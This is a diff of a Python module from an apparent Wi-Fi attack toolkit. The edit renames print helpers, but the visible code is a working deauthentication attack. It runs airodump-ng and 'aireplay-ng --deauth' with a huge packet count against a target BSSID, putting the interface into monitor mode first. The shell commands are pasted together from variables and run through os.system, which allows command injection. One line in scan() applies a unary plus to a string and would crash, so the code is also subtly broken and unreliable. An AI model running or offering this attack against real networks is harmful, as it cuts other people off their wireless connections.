@@ -43,25 +43,25 @@ changelog = "Version 1.0:\n\trelease"
 
 
 def run():
-    printInfo("attack has been started on : " + variables['essid'][0])
-    printInfo("use command 'stop' to end attack" + colors.end)
+    print_info("attack has been started on : " + variables['essid'][0])
+    print_info("use command 'stop' to end attack" + colors.end)
     xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
     os.system(xterm_3)
     xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
     os.system(xterm_4)
     os.system(xterm_4)
-    printInfo("attack started")
+    print_info("attack started")
 
 def stop(args):
     subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     xterm_5 =  "airmon-ng"+" stop " + variables['interface'][0]
     os.system(xterm_5)
-    printSuccess("process terminated...")
+    print_success("process terminated...")
 
 def scan(args):
     xterm_1 = "airmon-ng"+" start " + variables['interface'][0]
     xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
     subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     os.system(xterm_2)
-    printSuccess("scan started")
+    print_success("scan started")
